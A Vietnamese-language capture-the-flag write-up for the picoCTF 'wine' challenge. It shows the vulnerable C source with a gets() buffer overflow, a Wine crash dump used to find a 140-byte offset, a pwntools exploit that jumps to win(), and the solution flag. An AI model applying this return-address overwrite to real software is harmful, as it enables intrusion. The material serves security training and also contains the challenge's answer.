## wine
# Description:
Challenge best paired with wine.

I love windows. 

Checkout my `program` running on a linux box. Unzip the archive with the password picoctf and connect with it using `nc saturn.picoctf.net 62306`
# Solution:

* Đầu tiên, check file source và ta thấy lỗ hổng tràn bộ đệm ở `gets()` trong hàm `vuln`.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```

* Dùng gdb để debug và tìm được địa chỉ hàm `win()` 
```
0x00401530  win
```

* Tiếp theo cần phải xác định số byte cần để ghi đè.
* Tạo một chuỗi với 200 kí tự bằng `cyclic()`
```
>>> from pwn import *
>>> pattern = cyclic(200)
>>> print(pattern)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```
* Truyền chuỗi này vào chương trình và thu được lỗi:
```
└─$ nc saturn.picoctf.net 62306
Give me a string!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Unhandled exception: page fault on read access to 0x6261616b in 32-bit code (0x6261616b).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:6261616b ESP:0064fe80 EBP:6261616a EFLAGS:00010246(  R- --  I  Z- -P- )
 EAX:0064fdf0 EBX:00230e78 ECX:0064fde0 EDX:7fec48d8
 ESI:00000005 EDI:0021d6c0
Stack dump:
0x0064fe80:  6261616c 6261616d 6261616e 6261616f
0x0064fe90:  62616170 62616171 62616172 62616173
0x0064fea0:  62616174 62616175 62616176 62616177
0x0064feb0:  62616178 62616179 00230e00 0021d6c0
0x0064fec0:  008ba875 0b6be064 00000000 00000000
0x0064fed0:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x6261616b (0x6261616a)
0x6261616b: -- no code accessible --
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 (D) Z:\challenge\vuln.exe
        00000009    0 <==
0000000c services.exe
        0000000e    0
        0000000d    0
00000012 explorer.exe
        00000013    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows Server 2008 R2
    Host system: Linux
    Host version: 6.5.0-1016-aws
```

* Để ý vào dòng "Unhandled exception: page fault on read access to 0x6261616b in 32-bit code (0x6261616b)" nhận thấy chương trình đã bị crash do ko thể truy cập được địa chỉ 0x6261616b.
* Xác định số byte ít nhất cần để ghi đè
```
>>> cyclic_find(0x6261616b)
140
```

* Vậy xác định được địa chỉ hàm win và số bytes => file `exploit.py`
```
from pwn import *

p = remote("saturn.picoctf.net", 62757)

p.sendline(b'a'*140 + b'\x30\x15\x40\x00')

print(p.recvall())
```

Flag: `picoCTF{Un_v3rr3_d3_v1n_2ef42747}`